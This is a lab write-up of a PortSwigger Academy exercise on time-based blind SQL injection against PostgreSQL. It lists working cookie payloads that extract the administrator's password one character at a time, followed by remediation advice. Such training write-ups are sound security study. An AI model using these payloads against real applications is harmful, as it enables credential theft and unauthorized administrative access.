# Time-Based Blind SQL Injection – Information Retrieval

**Platform:** PortSwigger Web Security Academy
**Difficulty:** Practitioner
**Category:** Blind SQL Injection
**Status:** Solved
**Database:** PostgreSQL
**Tool:** Burp Suite

## Objective

Exploit a time-based blind SQL injection vulnerability to retrieve the administrator's password from the `users` table and authenticate as the administrator.

## Methodology

1. Intercepted the application's HTTP request using Burp Suite.
2. Identified the `TrackingId` cookie as a potential SQL injection point.
3. Tested time-delay functions to identify the database behavior.
4. Confirmed PostgreSQL using the `pg_sleep()` function.
5. Used conditional SQL statements (`CASE WHEN`) to trigger delays based on specific conditions.
6. Identified the administrator account in the `users` table.
7. Determined the password length using the `LENGTH()` function.
8. Extracted the password character by character using the `SUBSTRING()` function.
9. Reconstructed the complete password based on response-time differences.
10. Logged in successfully as the administrator.

## Payloads

### 1. Basic Time-Delay Test (MySQL)

```sql
'|| (SELECT SLEEP(10))
```

### 2. PostgreSQL Time-Delay Test

```sql
' || (SELECT pg_sleep(10))--
```

### 3. Conditional Time-Delay Test

```sql
' || (SELECT CASE
WHEN (1=1)
THEN pg_sleep(10)
ELSE pg_sleep(0)
END)--
```

### 4. Identify the Administrator Account

```sql
' || (SELECT CASE
WHEN (username='administrator')
THEN pg_sleep(10)
ELSE pg_sleep(0)
END FROM users)--
```

### 5. Determine Password Length

```sql
' || (SELECT CASE
WHEN (username='administrator' AND LENGTH(password)>1)
THEN pg_sleep(10)
ELSE pg_sleep(0)
END FROM users)--
```

### 6. Extract Password Characters

```sql
' || (SELECT CASE
WHEN (username='administrator'
AND SUBSTRING(password,1,1)='a')
THEN pg_sleep(10)
ELSE pg_sleep(0)
END FROM users)--
```

The character position and tested character were changed repeatedly. A 10-second delay indicated that the tested condition was true.

## Vulnerability

The application incorporated user-controlled cookie values into SQL queries without proper parameterization, allowing an attacker to execute time-based blind SQL injection.

## Impact

An attacker could retrieve sensitive database information, including usernames and passwords, without receiving direct query results. This could lead to account compromise and unauthorized administrative access.

## Remediation

* Use parameterized queries and prepared statements.
* Never concatenate user-controlled input directly into SQL queries.
* Implement proper input validation.
* Store passwords using secure password-hashing algorithms.
* Apply the principle of least privilege to database accounts.

## Evidence

*Screenshot showing the modified TrackingId cookie, conditional time delays, and successful administrator login.*

## Result

Successfully exploited the time-based blind SQL injection vulnerability, retrieved the administrator's password character by character, and authenticated as the administrator.
